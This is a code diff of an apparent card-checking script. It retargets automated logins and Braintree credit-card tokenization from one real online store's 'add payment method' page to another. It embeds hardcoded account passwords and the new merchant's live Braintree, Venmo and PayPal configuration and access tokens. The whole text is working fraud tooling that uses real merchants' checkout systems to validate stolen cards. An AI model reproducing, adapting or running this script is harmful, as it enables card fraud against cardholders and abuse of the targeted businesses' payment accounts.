@@ -159,11 +159,11 @@ for y in y:
     r = requests.session()
     headers = {'user-agent': user}
     response = r.post(
-        'https://www.studynotesaba.com/my-account/add-payment-method/', headers=headers)
+        'https://www.littleforbig.com/my-account/add-payment-method/', headers=headers)
     nonce = (re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text).group(1))
     data = {
     'username': email,
-    'password': 'ZmwXn8zkU2kK!LP',
+    'password': 'N8JMq4S9Ac@J6xS',
     'wpa_initiator': '',
     'alt_s': '',
     'udwsno9687': '828176',
@@ -174,7 +174,7 @@ for y in y:
 }
     
     response = r.post(
-        'https://www.studynotesaba.com/my-account/add-payment-method/',
+        'https://www.littleforbig.com/my-account/add-payment-method/',
         cookies=r.cookies,
         headers=headers,
         data=data,
@@ -206,7 +206,7 @@ for y in y:
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': '5072621e-1032-487f-975f-d3179579279c',
+        'sessionId': '41b5931d-19a7-4e94-9a12-0a61c9a49420',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -239,7 +239,7 @@ for y in y:
         'content-type': 'application/x-www-form-urlencoded',
         'origin': 'https://www.studynotesaba.com',
         'priority': 'u=0, i',
-        'referer': 'https://www.studynotesaba.com/my-account/add-payment-method/',
+        'referer': 'https://www.littleforbig.com/my-account/add-payment-method/',
         'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Windows"',
@@ -253,16 +253,16 @@ for y in y:
     data = {
     'payment_method': 'braintree_cc',
     'braintree_cc_nonce_key': tok,
-    'braintree_cc_device_data': '',
+    'braintree_cc_device_data': '{"device_session_id":"ad0364caef34e9a9970670f6a217f8f5","fraud_merchant_id":null,"correlation_id":"1772d25c299529e8c27379586f2ec7ac"}',
     'braintree_cc_3ds_nonce_key': '',
-    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/zgmjz6bk4shsk2zd/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/zgmjz6bk4shsk2zd"},"merchantId":"zgmjz6bk4shsk2zd","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"zgmjz6bk4shsk2zd","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["American Express","Discover","JCB","MasterCard","Visa","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Uncle Jims Worm Farm","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mzg1NDA1OTMsImp0aSI6ImQzODVhM2FjLWM5YjgtNDUzYy05NjIyLTQxNDhhN2QzMGNjYyIsInN1YiI6InpnbWp6NmJrNHNoc2syemQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InpnbWp6NmJrNHNoc2syemQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.5aZkDzrrJMAbK12hDtWr80BOUWotxNzcAfiA40_rh8KqV3ihxY2_k16ANusUeycNdtBx9qGnF_GGRPCMHR2A4A","paypalClientId":"ATLxCsU3hyoXL6tIuU4X5FH4zBJ7BoD_-BTfhyHrYdFqbzLhqY7GIKNOrpCIPU4WDpdzZ3XUALu6971a","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"3119910952783315598","accessToken":"access_token$production$zgmjz6bk4shsk2zd$c0462a05c55ebba64c943763ea0be348","environment":"production","enrichedCustomerDataEnabled":false},"paypalEnabled":false}',
+    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/rj5zxgnr93zj4v9q/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/rj5zxgnr93zj4v9q"},"merchantId":"rj5zxgnr93zj4v9q","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["American Express","Discover","JCB","MasterCard","Visa","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"payWithVenmo":{"merchantId":"3333880897123385592","accessToken":"access_token$production$rj5zxgnr93zj4v9q$f1456792da15c1a13e2bcbd2c84bad81","environment":"production"},"paypalEnabled":true,"paypal":{"displayName":"LITTLEFORBIG, LLC","clientId":"AXQu4FQ0OMfVhlEP7zXwXl5zfLhpVD65I0hvNZEwGq4WbL-oqdr2Pm_XUxSV6KwivV6rCKKs5Ea4WAlx","privacyUrl":null,"userAgreementUrl":null,"assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"littleforbigllc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
     'woocommerce-add-payment-method-nonce': nonce,
     '_wp_http_referer': '/my-account/add-payment-method/',
     'woocommerce_add_payment_method': '1',
 }
     
     response = r.post(
-        'https://www.studynotesaba.com/my-account/add-payment-method/',
+        'https://www.littleforbig.com/my-account/add-payment-method/',
         cookies=r.cookies,
         headers=headers,
         data=data,
